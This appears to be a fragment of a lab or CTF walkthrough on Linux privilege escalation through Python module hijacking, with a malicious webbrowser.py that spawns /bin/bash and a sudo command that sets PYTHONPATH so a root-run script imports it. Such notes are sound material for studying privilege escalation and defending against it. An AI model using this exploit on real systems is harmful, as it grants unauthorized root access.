
- We have two Python files:
    
    - `hack.py` (running as root via sudo)
        
    - Malicious `webbrowser.py` (created by attacker(you) in `/home/user`)
    
```python
import os

def run():
    os.system("/bin/bash")
```

- When the root script imports and calls `run()` from this malicious module, it will open a root shell (`/bin/bash`) for you.

```python
sudo PYTHONPATH=/home/user /usr/bin/python3.8 /home/user/hack.py
```

- This sets `PYTHONPATH` so Python imports the attacker's `webbrowser.py` module first, running code with root privileges.